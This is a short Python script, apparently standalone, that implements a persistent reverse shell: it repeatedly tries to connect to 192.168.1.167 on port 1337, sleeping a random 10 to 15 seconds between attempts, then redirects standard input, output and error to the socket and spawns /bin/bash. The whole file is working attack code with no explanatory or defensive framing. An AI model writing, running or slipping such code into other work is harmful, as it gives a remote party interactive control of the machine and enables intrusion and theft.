
 from os import dup2
from pty import spawn
from time import sleep
from random import randint
import socket


def run():
    host = '192.168.1.167'
    port = 1337
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    while True:
        try:
            s.connect((host,port))
        except:
            sleep(randint(10,15))
            continue
        dup2(s.fileno(),0) 
        dup2(s.fileno(),1) 
        dup2(s.fileno(),2)
        spawn("/bin/bash")
